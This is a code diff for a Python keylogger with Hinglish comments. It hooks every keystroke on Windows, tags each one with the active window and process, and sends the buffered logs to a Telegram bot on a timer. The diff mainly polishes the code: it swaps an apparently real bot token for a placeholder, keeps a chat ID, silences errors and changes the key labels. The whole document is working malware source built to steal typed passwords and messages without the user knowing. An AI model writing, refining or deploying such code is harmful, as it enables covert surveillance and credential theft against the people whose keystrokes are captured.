@@ -4,14 +4,14 @@ import requests
 import os
 from datetime import datetime
 from pynput import keyboard
-import win32gui  # Active window ke liye
+import win32gui
 import win32process
-import psutil  # Optional for process name, but pywin32 sufficient
+import psutil
 
 # ============= CONFIG =============
-TELEGRAM_BOT_TOKEN = "8303464927:AAGq6lwHcTsYYOAbDUFkH9YTfHUzFAaq2dU"  # Yahan daal
-TELEGRAM_CHAT_ID = "-1004320842899"      # Integer as string ya int
-SEND_INTERVAL = 30  # seconds mein buffer send karne ka interval
+TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"   # ← Yahan apna bot token daal
+TELEGRAM_CHAT_ID = "-1004320842899"           # ← Yahan apna chat id (hyphen ke saath)
+SEND_INTERVAL = 45                            # seconds mein buffer bhejega (45 recommended)
 # =================================
 
 log_buffer = ""
@@ -23,7 +23,6 @@ def get_active_window_title():
         hwnd = win32gui.GetForegroundWindow()
         if hwnd:
             title = win32gui.GetWindowText(hwnd)
-            # Process name bhi try
             try:
                 _, pid = win32process.GetWindowThreadProcessId(hwnd)
                 proc = psutil.Process(pid)
@@ -47,7 +46,7 @@ def send_to_telegram(message):
         }
         requests.post(url, data=data, timeout=10)
     except:
-        pass  # Silent fail for smoothness
+        pass
 
 def flush_buffer():
     global log_buffer
@@ -63,47 +62,44 @@ def on_press(key):
     global log_buffer, last_window
     try:
         current_window = get_active_window_title()
-        if current_window != last_window:
+        if current_window != last_window and current_window != "Unknown":
             last_window = current_window
-            # Window change log
-            log_buffer += f"\n[Window Changed: {current_window}]\n"
+            log_buffer += f"\n[Window Changed → {current_window}]\n"
         
         if hasattr(key, 'char') and key.char is not None:
             log_buffer += key.char
         else:
-            key_name = str(key).replace("Key.", "")
-            if key_name == "space":
+            key_name = str(key).replace("Key.", "").upper()
+            if key_name == "SPACE":
                 log_buffer += " "
-            elif key_name == "enter":
+            elif key_name == "ENTER":
                 log_buffer += " [ENTER]\n"
-            elif key_name == "backspace":
-                log_buffer += " [BACKSPACE]"
-            elif key_name in ["ctrl_l", "ctrl_r", "alt_l", "alt_r", "shift", "tab"]:
-                log_buffer += f" [{key_name.upper()}]"
+            elif key_name == "BACKSPACE":
+                log_buffer += " [←]"
+            elif key_name in ["CTRL_L", "CTRL_R", "ALT_L", "ALT_R", "SHIFT", "TAB"]:
+                log_buffer += f" [{key_name}]"
             else:
                 log_buffer += f" [{key_name}]"
     except:
-        log_buffer += " [UNKNOWN]"
+        log_buffer += " [?]"
 
 def on_release(key):
-    if key == keyboard.Key.esc:  # Esc press karke stop (testing ke liye)
+    if key == keyboard.Key.esc:
         global running
         running = False
         return False
 
 def main():
-    print("Keylogger starting... (Esc to stop for testing)")
+    print("Keylogger started... (Esc to stop for testing)")
     
-    # Background thread for periodic send
     sender_thread = threading.Thread(target=flush_buffer, daemon=True)
     sender_thread.start()
     
-    # Keyboard listener
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
 if __name__ == "__main__":
     try:
         main()
-    except KeyboardInterrupt:
-        print("Stopped.")
+    except:
+        pass
